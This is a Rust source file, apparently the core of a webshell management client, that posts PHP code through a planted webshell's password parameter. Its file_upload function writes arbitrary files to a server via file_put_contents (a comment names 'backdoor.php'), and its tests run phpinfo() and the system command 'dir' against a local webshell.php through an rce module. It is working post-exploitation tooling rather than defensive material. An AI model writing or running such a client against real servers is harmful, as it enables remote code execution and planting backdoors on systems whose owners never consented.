use core::rce;
use reqwest::{self, Client};
use std::collections::HashMap;
use utils::request;

pub mod core;
pub mod utils;

// pub use self::core::rce;
// pub use self::utils::encode;
// pub use self::utils::request;

// use crate::core::rce;
// use crate::utils::request;

// const FILE_UPLOAD_PHP: String = ""

/// 使用 php 的 file_put_contents() 函数进行文件上传
pub async fn file_upload(
    url: &str,
    key: &str,
    file: &str,
    filename: &str,
    client: Client,
) -> Result<bool, reqwest::Error> {
    let command = format!(r#"file_put_contents("{filename}", "{file}");"#);
    // file_put_contents('backdoor.php', '112233');

    // TODO: 此处只考虑了 post 方法

    dbg!(&command);

    let params = HashMap::from([(key, command.as_str())]);

    let _ = request::post_request(&client, &url, params).await?;

    Ok(is_url_return_ok(&url, &client).await)
}

pub async fn is_url_return_ok(url: &str, client: &Client) -> bool {
    let response = client.get(url).send().await;
    response.is_ok()
}

pub async fn upload_base64_file(
    url: &str,
    key: &str,
    file: &str,
    filename: &str,
    client: Client,
) -> Result<bool, reqwest::Error> {
    Ok(true)
}

#[cfg(test)]
mod tests {

    use super::*;

    const URL: &str = "http://127.0.0.1/webshell.php";
    const KEY: &str = "1";

    #[tokio::test]
    async fn test_get() {
        let client = reqwest::Client::new();
        let res = request::get_with_key(
            "http://127.0.0.1/webshell.php".to_string(),
            "1",
            "phpinfo();",
            &client,
        )
        .await
        .unwrap();
        println!("res: {:?}", res);
    }

    #[test]
    fn test_rand() {
        println!("{:?}", rce::gen_random_key());
    }

    #[tokio::test]
    async fn test_echo_system_command() -> Result<(), Box<dyn std::error::Error>> {
        let text = rce::echo_base64_encode_system_command(
            "http://127.0.0.1/webshell.php".to_string(),
            "1",
            "dir".to_string(),
        )
        .await?;
        println!("{:?}", text);
        Ok(())
    }

    #[tokio::test]
    async fn test_file_upload() {
        let file = "testforfileupload1";
        let file_name = "test_file.php";
        let client = Client::new();
        let res = file_upload(URL, KEY, file, file_name, client)
            .await
            .unwrap_or_else(|_| false);
        println!("{:?}", res)
    }
}
